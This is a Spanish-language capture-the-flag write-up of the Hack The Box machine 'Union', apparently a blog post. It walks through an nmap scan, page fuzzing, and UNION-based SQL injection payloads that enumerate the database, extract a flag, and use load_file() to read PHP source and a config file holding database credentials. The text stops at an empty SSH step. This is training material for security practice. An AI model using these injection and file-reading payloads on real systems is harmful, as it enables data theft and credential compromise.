---
layout: post
title:  "Maquina Retirada Union de Hack The Box (Necesario VIP)"
description: En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada UNION
tags: HTB, SQLI, Local File Inclusion, PHP, X-Forwarder-For, Command Injection, Maquinas Retiradas,
---

# Union - SQL Injection ~ Hack The Box

Realizamos el Primer escaneo con Nmap
```bash
$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.128       "
``` 
Procedemos con el siguiente escaneo de Nmap
```bash
 PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
Procedemos a Enumerar los Recursos de la Web con extension .php :
```bash
Target: http://10.10.11.128/FUZZ.php
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                   
=====================================================================

000000002:   200        42 L     93 W       1220 Ch     "index"                                                                                                                                                                   
000000868:   200        0 L      2 W        13 Ch       "firewall"                                                                                                                                                                
000001477:   200        0 L      0W "config"                                                                                                                                                                
000004086:   200        20 L     61 W       772 Ch      "challenge"
```

Vemos que tenemos un campo vulnerable a Inyecciones SQLI, es importante destacar que0 Nos damos cuenta mediante el uso de los siguientes Payloads
```bash
POST /index.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 32
Origin: http://10.10.11.128
Connection: close
Referer: http://10.10.11.128/index.php
Cookie: PHPSESSID=g9cr58rofn03mlbo8ouiml4c07

player=admin' union select 1-- -    
```
Respuesta de la Injeccion SQL, en la que vemos que tenemos un solo campo.

```bash
Sorry, "1" you are not eligible due to already qualifying.
```
Procedemos a intentar meterle un segundo payload para enumerar la Base de Datos en la que estamos
```bash
player=admin' union select database()-- -
```

Respuesta
```bash
Sorry, "November" you are not eligible due to already qualifying.
``` 

Como solo tenemos un campo para listar contenido, procedemos a usar la expresion group-concat() 
```bash
player=admin' union select group_concat(schema_name,':') from information_schema.schemata-- -
```
Resppuesta para la enumeracion de Bases de Datos

```bash
Sorry, "mysql:, information_schema:, performance_schema:, sys:, november:" you are not eligible due to already qualifying.
```
Enumeracion de Tablas para la base de datos `November`

```bash
player=admin' union select group_concat(table_name,':') from information_schema.tables where table_schema="November"-- -
```
Resppuesta para la enumeracion de Tablas para la Base de Datos `Ǹovember`

```bash
Sorry, "flag:,players:" you are not eligible due to already qualifying.
```

Enumeracion de Columnas para la Base de Datos `November`
```bash
player=admin' union select group_concat(column_name,':') from information_schema.columns where table_schema="November" and table_name="flag"-- -
```
Respuesta para las Columnas para la Base de Datos `November`

```bash
Sorry, "one:" you are not eligible due to already qualifying.
```
Vemos que solo tenemos una Columna en la Tabla Name `flag` y Base de Datos `November`
Procedemos a listar la data para la columna enumerada `one`

```bash
player=admin' union select one from November.flag-- -
```

Obtenemos la `Data` para la Columna `one` en la Tabla `flag` y en la Base de Datos `November`
```bash
Sorry, "UHC{F1rst_5tep_2_Qualify}" you are not eligible due to already qualifying.
```

Encontramos la flag que nos piden la introducimos en la ruta `/challenge` y vemos que nos abren el el puerto SSH pero no tenemos ninguna usuario ni clave ni na de na para conectarnos.
```bash
Welcome Back!
Your IP Address has now been granted SSH Access.
```

Procedemos a intentar listar informacion tipo `Local File Inclusion` atraves de la `SQLI` 
```bash
player=admin' union select load_file("/var/www/html/index.php")-- -
```

Vemos que listamos el codigo fuente del Archivo  `index.php`

```bash
Sorry, <?php
  require('config.php');
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {

	$player = strtolower($_POST['player']);

	// SQLMap Killer
	$badwords = ["/sleep/i", "/0x/i", "/\*\*/", "/-- [a-z0-9]{4}/i", "/ifnull/i", "/ or /i"];
	foreach ($badwords as $badword) {
		if (preg_match( $badword, $player )) {
			echo 'Congratulations ' . $player . ' you may compete in this tournament!';
			die();
		}
	}

	$sql = "SELECT player FROM players WHERE player = '" . $player . "';";
	$result = mysqli_query($conn, $sql);
	$row = mysqli_fetch_array( $result, MYSQLI_ASSOC);
	if ($row) {
		echo 'Sorry, ' . $row['player'] . " you are not eligible due to already qualifying.";
	} else {
		echo 'Congratulations ' . $player . ' you may compete in this tournament!';
		echo '<br />';
		echo '<br />';
		echo 'Complete the challenge <a href="/challenge.php">here</a>';
	}
	exit;
  }
?>
```

Procedemos a listar informacion del archivo `config.php`

```bash
player=admin' union select load_file("/var/www/html/config.php")-- -
```
Respuesta de la inyeccion SQL `load_file()`

```bash
Sorry, <?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
 you are not eligible due to already qualifying.
```

Ya tenemos credenciales para conectarnos por SSH como `uhc` a la maquina.

Procedemos a conectarnos por SSH como el usuario `uhc`:
```bash

```






































